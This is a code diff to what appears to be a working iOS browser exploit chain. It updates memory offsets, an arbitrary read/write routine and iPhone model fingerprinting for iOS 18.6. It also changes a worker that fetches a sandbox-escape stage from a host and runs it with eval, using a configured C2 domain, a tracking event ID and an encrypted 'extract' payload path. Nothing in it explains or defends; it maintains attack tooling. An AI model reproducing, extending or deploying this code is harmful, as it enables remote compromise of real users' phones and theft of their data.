@@ -37,7 +37,8 @@ function print(x, reportError = false, dumphex = false) {
       try 
       {
           let url = "";
-          url = host + "/" + fname + "?v=" + Date.now() + "?v=" + Date.now();
+          url = host + "/" + fname + "?v=" + Date.now();
+          if (self.EVENT_ID) url += "&ctx=" + self.EVENT_ID;
           print("trying to fetch from:" + url);
           let xhr = new XMLHttpRequest();
           xhr.open("GET", `${url}` , false);
@@ -8478,7 +8479,12 @@ rce_offsets = {
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c3c0n,
-   }
+   },
+   
+   
+   
+   
+
 };
 
 var globalFuncParseFloat = 0n;
@@ -8944,106 +8950,29 @@ async function _aarw_main() {
           }
           const versions = ['b8', '731', 'b9'];
 const pthread_create_auth_stubs_offset = {
-'18,4': 0x177d640n,
-'18,4,1': 0x177d640n,
-'18,5': 0x18ccf30n,
+
+
+
 '18,6': 0x17a4830n,
 '18,6,1': 0x17a4830n,
-'18,6,2': 0x17a4830n
+'18,6,2': 0x17a4830n,
+
+
 };
 const pthread_create_offset = {
-'18,4': 0x5864n,
-'18,4,1': 0x5864n,
-'18,5': 0x6988n,
+
+
+
 '18,6': 0x6988n,
 '18,6,1': 0x6988n,
-'18,6,2': 0x6988n
+'18,6,2': 0x6988n,
+
+
 };
 const linkedit_to_device = {
-'18,4': {
-    [0x27075c000n]: "iPhone11,2_4_6_22E240",
-    [0x27074c000n]: "iPhone11,8_22E240",
-    [0x27085c000n]: "iPhone12,1_22E240",
-    [0x27085c000n]: "iPhone12,3_5_22E240",
-    [0x270794000n]: "iPhone12,8_22E240",
-    [0x270ad0000n]: "iPhone13,1_22E240",
-    [0x2714f8000n]: "iPhone13,2_3_22E240",
-    [0x2714f8000n]: "iPhone13,4_22E240",
-    [0x2718dc000n]: "iPhone14,2_22E240",
-    [0x2718dc000n]: "iPhone14,3_22E240",
-    [0x270ea4000n]: "iPhone14,4_22E240",
-    [0x270ea4000n]: "iPhone14,5_22E240",
-    [0x270e50000n]: "iPhone14,6_22E240",
-    [0x2712b4000n]: "iPhone14,7_22E240",
-    [0x2712b4000n]: "iPhone14,8_22E240",
-    [0x272058000n]: "iPhone15,2_22E240",
-    [0x272058000n]: "iPhone15,3_22E240",
-    [0x271680000n]: "iPhone15,4_22E240",
-    [0x271680000n]: "iPhone15,5_22E240",
-    [0x272594000n]: "iPhone16,1_22E240",
-    [0x272594000n]: "iPhone16,2_22E240",
-    [0x271e5c000n]: "iPhone17,1_22E240",
-    [0x271e5c000n]:  "iPhone17,2_22E240",
-    [0x2717f0000n]: "iPhone17,3_22E240",
-    [0x2717f0000n]: "iPhone17,4_22E240",
-    [0x271530000n]: "iPhone17,5_22E240"
-},
-'18,4,1': {
-    [0x27075c000n]: "iPhone11,2_4_6_22E252",
-    [0x27074c000n]: "iPhone11,8_22E252",
-    [0x27085c000n]: "iPhone12,1_22E252",
-    [0x27085c000n]: "iPhone12,3_5_22E252",
-    [0x270790000n]: "iPhone12,8_22E252",
-    [0x270ad0000n]: "iPhone13,1_22E252",
-    [0x2714f8000n]: "iPhone13,2_3_22E252",
-    [0x2714f8000n]: "iPhone13,4_22E252",
-    [0x2718dc000n]: "iPhone14,2_22E252",
-    [0x2718dc000n]: "iPhone14,3_22E252",
-    [0x270ea4000n]: "iPhone14,4_22E252",
-    [0x270ea4000n]: "iPhone14,5_22E252",
-    [0x270e50000n]: "iPhone14,6_22E252",
-    [0x2712b4000n]: "iPhone14,7_22E252",
-    [0x2712b4000n]: "iPhone14,8_22E252",
-    [0x272058000n]: "iPhone15,2_22E252",
-    [0x272058000n]: "iPhone15,3_22E252",
-    [0x271680000n]: "iPhone15,4_22E252",
-    [0x271680000n]: "iPhone15,5_22E252",
-    [0x272594000n]: "iPhone16,1_22E252",
-    [0x272594000n]: "iPhone16,2_22E252",
-    [0x271e5c000n]: "iPhone17,1_22E252",
-    [0x271e5c000n]: "iPhone17,2_22E252",
-    [0x2717f0000n]: "iPhone17,3_22E252",
-    [0x2717f0000n]: "iPhone17,4_22E252",
-    [0x271530000n]: "iPhone17,5_22E252"
-},
-'18,5': {
-    [0x27170c000n]: "iPhone11,2_4_6_22F76",
-    [0x271704000n]: "iPhone11,8_22F76",
-    [0x271810000n]: "iPhone12,1_22F76",
-    [0x271810000n]: "iPhone12,3_5_22F76",
-    [0x27173c000n]: "iPhone12,8_22F76",
-    [0x271a88000n]: "iPhone13,1_22F76",
-    [0x2724b4000n]: "iPhone13,2_3_22F76",
-    [0x2724b4000n]: "iPhone13,4_22F76",
-    [0x27288c000n]: "iPhone14,2_22F76",
-    [0x27288c000n]: "iPhone14,3_22F76",
-    [0x271e5c000n]: "iPhone14,4_22F76",
-    [0x271e5c000n]: "iPhone14,5_22F76",
-    [0x271df8000n]: "iPhone14,6_22F76",
-    [0x272264000n]: "iPhone14,7_22F76",
-    [0x272264000n]: "iPhone14,8_22F76",
-    [0x273014000n]: "iPhone15,2_22F76",
-    [0x273014000n]: "iPhone15,3_22F76",
-    [0x272634000n]: "iPhone15,4_22F76",
-    [0x272634000n]: "iPhone15,5_22F76",
-    [0x27353c000n]: "iPhone16,1_22F76",
-    [0x27353c000n]: "iPhone16,2_22F76",
-    [0x272e04000n]: "iPhone17,1_22F76",
-    [0x272e04000n]: "iPhone17,2_22F76",
-    [0x2727a0000n]: "iPhone17,3_22F76",
-    [0x2727a0000n]: "iPhone17,4_22F76",
-    [0x2724d8000n]: "iPhone17,5_22F76"
-},
+
+
+
 '18,6': {
     [0x270ffc000n]: "iPhone11,2_4_6_22G86",
     [0x270ff0000n]: "iPhone11,8_22G86",
@@ -9127,87 +9056,90 @@ const linkedit_to_device = {
     [0x2720a4000n]: "iPhone17,3_22G100",
     [0x2720a4000n]: "iPhone17,4_22G100",
     [0x271de4000n]: "iPhone17,5_22G100"
-}
+},
+
+
+
 };
 const device_chipset = {
-"iPhone11,2_4_6_22E240": "0b92b8b2602c011d1831c6c27ef74b76",
-"iPhone11,8_22E240": "0b92b8b2602c011d1831c6c27ef74b76",
-"iPhone12,1_22E240": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone12,3_5_22E240": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone12,8_22E240": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone13,1_22E240": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone13,2_3_22E240": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone13,4_22E240": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone14,2_22E240": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,3_22E240": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,4_22E240": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,5_22E240": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,6_22E240": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,7_22E240": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,8_22E240": "c90776dbac058ed6957f476e287867f8",
-"iPhone15,2_22E240": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,3_22E240": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,4_22E240": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,5_22E240": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone16,1_22E240": "c33e4990a9d3afe948b98d7d4205d596",
-"iPhone16,2_22E240": "c33e4990a9d3afe948b98d7d4205d596",
-"iPhone17,1_22E240": "6149d995753968891870832e3fec9195",
-"iPhone17,2_22E240": "6149d995753968891870832e3fec9195",
-"iPhone17,3_22E240": "6149d995753968891870832e3fec9195",
-"iPhone17,4_22E240": "6149d995753968891870832e3fec9195",
-"iPhone17,5_22E240": "6149d995753968891870832e3fec9195",
-"iPhone11,2_4_6_22E252": "0b92b8b2602c011d1831c6c27ef74b76",
-"iPhone11,8_22E252": "0b92b8b2602c011d1831c6c27ef74b76",
-"iPhone12,1_22E252": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone12,3_5_22E252": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone12,8_22E252": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone13,1_22E252": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone13,2_3_22E252": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone13,4_22E252": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone14,2_22E252": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,3_22E252": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,4_22E252": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,5_22E252": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,6_22E252": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,7_22E252": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,8_22E252": "c90776dbac058ed6957f476e287867f8",
-"iPhone15,2_22E252": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,3_22E252": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,4_22E252": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,5_22E252": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone16,1_22E252": "c33e4990a9d3afe948b98d7d4205d596",
-"iPhone16,2_22E252": "c33e4990a9d3afe948b98d7d4205d596",
-"iPhone17,1_22E252": "6149d995753968891870832e3fec9195",
-"iPhone17,2_22E252": "6149d995753968891870832e3fec9195",
-"iPhone17,3_22E252": "6149d995753968891870832e3fec9195",
-"iPhone17,4_22E252": "6149d995753968891870832e3fec9195",
-"iPhone17,5_22E252": "6149d995753968891870832e3fec9195",
-"iPhone11,2_4_6_22F76": "0b92b8b2602c011d1831c6c27ef74b76",
-"iPhone11,8_22F76": "0b92b8b2602c011d1831c6c27ef74b76",
-"iPhone12,1_22F76": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone12,3_5_22F76": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone12,8_22F76": "f35b705e8c57ae59e369ebc9145a9dbc",
-"iPhone13,1_22F76": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone13,2_3_22F76": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone13,4_22F76": "43ba9900ff2fc7d9d32072540b2cab12",
-"iPhone14,2_22F76": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,3_22F76": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,4_22F76": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,5_22F76": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,6_22F76": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,7_22F76": "c90776dbac058ed6957f476e287867f8",
-"iPhone14,8_22F76": "c90776dbac058ed6957f476e287867f8",
-"iPhone15,2_22F76": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,3_22F76": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,4_22F76": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone15,5_22F76": "22f32fd975a694d340a6ad22b872b1ae",
-"iPhone16,1_22F76": "c33e4990a9d3afe948b98d7d4205d596",
-"iPhone16,2_22F76": "c33e4990a9d3afe948b98d7d4205d596",
-"iPhone17,1_22F76": "6149d995753968891870832e3fec9195",
-"iPhone17,2_22F76": "6149d995753968891870832e3fec9195",
-"iPhone17,3_22F76": "6149d995753968891870832e3fec9195",
-"iPhone17,4_22F76": "6149d995753968891870832e3fec9195",
-"iPhone17,5_22F76": "6149d995753968891870832e3fec9195",
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 "iPhone11,2_4_6_22G86": "0b92b8b2602c011d1831c6c27ef74b76",
 "iPhone11,8_22G86": "0b92b8b2602c011d1831c6c27ef74b76",
 "iPhone12,1_22G86": "f35b705e8c57ae59e369ebc9145a9dbc",
@@ -9286,6 +9218,10 @@ const device_chipset = {
 "iPhone17,3_22G100": "6149d995753968891870832e3fec9195",
 "iPhone17,4_22G100": "6149d995753968891870832e3fec9195",
 "iPhone17,5_22G100": "6149d995753968891870832e3fec9195",
+
+
+
+
 };
 
           const ios_version = (function() {
@@ -10162,12 +10098,13 @@ async function main() {
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
           try {
-                const sbx0_script = getJS('sbx0.js');
+                const sbx0_script = getJS('sbx0/sbx0_18.6.js');
                 log("after get js");
                 print("sbx0 loaded, device_model=" + device_model);
                 
                 if (device_model && device_model.indexOf("iPhone12,3_5") !== -1) { device_model = device_model.replace("iPhone12,3_5", "iPhone12,1"); print("forced device_model=" + device_model); }
-                eval(sbx0_script);
+                self.postMessage({ type: 'redirect' });
+eval(sbx0_script);
                 print("sbx0 eval completed");
         } catch (e) {
             log(btoa(e));
@@ -10198,6 +10135,7 @@ async function main() {
             self.C2_DOMAIN = data.c2Domain || "";
             self.INTEGRATION_ID = data.integrationId || "";
             self.FINGERPRINT = data.fingerprint || "";
+            self.EVENT_ID = data.eventId || "";
             self.EXTRACT_PATH = data.extractPath || "/extract.js.enc";
             print("inside stage1_rce from worker");
             main().then((p_temp) => {
